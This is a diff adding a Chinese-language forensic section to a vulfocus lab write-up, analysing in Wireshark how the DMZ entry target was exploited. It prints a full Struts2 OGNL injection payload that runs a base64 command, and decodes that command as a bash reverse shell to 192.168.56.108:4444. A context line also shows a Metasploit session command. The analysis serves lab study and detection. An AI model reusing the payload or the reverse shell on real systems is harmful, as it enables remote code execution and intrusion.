@@ -292,3 +292,24 @@ sessions -c "wget 'http://192.169.85.2/index.php?cmd=ls /tmp' -O /tmp/result && 
 提交至vulfocus处，成功，至此最后的靶标5也被成功攻破。
 
 ![alt text](image-37.png)
+
+## DMZ入口靶标的漏洞利用检测
+
+使用wireshark过滤规则`http`过滤相关数据包
+
+![alt text](35a8fc845f674ef809605ee887dd21e.png)
+
+进行url解码后获得如下：
+```
+id=%25%7b%28%23instancemanager%3d%23application%5b%22org.apache.tomcat.InstanceManager%22%5d%29.%28%23stack%3d%23attr%5b%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5d%29.%28%23bean%3d%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3d%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3d%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3d%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2c%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2c%23emptyset%29%29.%28%23execute%3d%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%7b%22bash%20-c%20%7becho%2cYmFzaCAtYyAnMDwmMTA1LTtleGVjIDEwNTw%2bL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDgvNDQ0NDtzaCA8JjEwNSA%2bJjEwNSAyPiYxMDUn%7d%7c%7bbase64%2c-d%7d%7cbash%22%7d%29%29%7d
+```
+
+进行base64编码后获得：
+
+`bash -c '0<&105-;exec 105<>/dev/tcp/192.168.56.108/4444;sh <&105 105>&105 2>&105'`
+
+* 可以看到这是一个典型的 Bash 反弹 Shell（Reverse Shell） 命令，用于建立与攻击者机器的远程连接。
+
+使用过滤规则：`ip.src == 192.168.56.108 && tcp.port== 4444`查看其相关执行的指令：
+
+![alt text](1742799464566.png)
